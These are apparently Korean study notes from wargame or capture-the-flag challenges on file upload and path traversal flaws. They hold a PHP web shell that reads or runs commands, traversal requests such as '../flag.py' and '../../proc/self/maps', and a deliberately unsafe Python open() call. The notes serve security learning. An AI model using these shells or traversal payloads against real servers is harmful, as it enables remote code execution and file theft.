# 파일 취약 (Upload / Download)

## 업로드

검증 없이 서버에 파일을 올리면, **실행 가능한 확장자**(예: `.php`)가 웹 루트에서 해석될 수 있다 → 웹쉘 → RCE.

**image-storage (#38)**

```php
<?php echo file_get_contents('/flag.txt'); ?>
```

또는 `system($_GET['cmd'])` 후 `?cmd=cat+/flag.txt`.

리스트만 클릭해 `cmd` 없이 `system(null)` 이 되면 PHP 8 등에서 500이 날 수 있다. 쿼리를 붙이거나 고정 출력 웹쉘을 쓴다.

업로드로 이어질 수 있는 영향 (개념): RCE, 악성 HTML을 통한 XSS·쿠키 탈취·CSRF 유도 등.

## 다운로드 · 경로 조작

사용자 입력이 경로에 그대로 붙으면 상위 디렉터리로 빠져나갈 수 있다.

```python
open(base_dir + "/" + filename)  # filename 무검증
```

**file-download-1 (#37)**

```text
/read?name=../flag.py
```

`UPLOAD_DIR` 한 단계 위의 `flag.py`.

퀴즈에서 본 예: `/data/uploads/` + `../../proc/self/maps` → 프로세스 메모리 맵 (`maps` = 배치 정보).

## Apache PHP 핸들러 (퀴즈)

```apache
<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
    SetHandler application/x-httpd-php
</FilesMatch>
```

해당 확장자를 PHP 엔진으로 실행한다는 설정.
